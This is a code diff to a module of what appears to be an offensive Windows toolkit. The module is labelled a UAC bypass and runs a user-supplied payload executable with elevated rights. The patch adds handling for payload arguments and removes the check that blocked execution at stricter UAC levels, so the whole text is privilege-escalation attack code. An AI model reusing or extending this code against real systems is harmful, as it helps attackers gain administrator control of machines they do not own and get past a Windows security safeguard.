@@ -7,7 +7,7 @@ runas_info = {
 	"Method": "Registry key manipulation",
 	"Id": "01",
 	"Type": "UAC bypass",
-	"Fixed In": "99999",
+	"Fixed In": "99999" if information().uac_level() == 1 else "0",
 	"Works From": "7600",
 	"Admin": False,
 	"Function Name": "runas",
@@ -35,22 +35,25 @@ def manifests(payload):
 
 def runas(payload):
 	if payloads().exe(payload):
+		if os.path.isfile(payload) and payload.endswith(".exe"):
+			params = ''
+		else:
+			# Manage payloads with args 
+			params = payload.replace(payload.split(' ', 1)[0], '').lstrip()
+			payload = payload.split(' ', 1)[0]
+
 		if os.path.isfile(os.path.join(payload)) == True:
 			if manifests(os.path.join(payload)):
-				process().runas(os.path.join(payload))
+				process().runas(payload=payload, params=params)
 			else:
 				if information().admin():
 					print_error("Cannot proceed, we are already elevated")
 					return False
 				else:
-					if information().uac_level() == 1:
-						if process().runas(os.path.join(payload)):
-							print_success("Successfully elevated process ({})".format(os.path.join(payload)))
-						else:
-							print_error("Unable to elevate process ({})".format(os.path.join(payload)))
+					if process().runas(payload=payload, params=params):
+						print_success("Successfully elevated process ({})".format(os.path.join(payload)))
 					else:
-						print_error("Unable to execute payload ({}) UAC level is to high".format(os.path.join(payload)))
-						return False
+						print_error("Unable to elevate process ({})".format(os.path.join(payload)))
 		else:
 			print_error("Unable to execute payload ({}) cannot find payload on disk".format(os.path.join(payload)))
 			return False
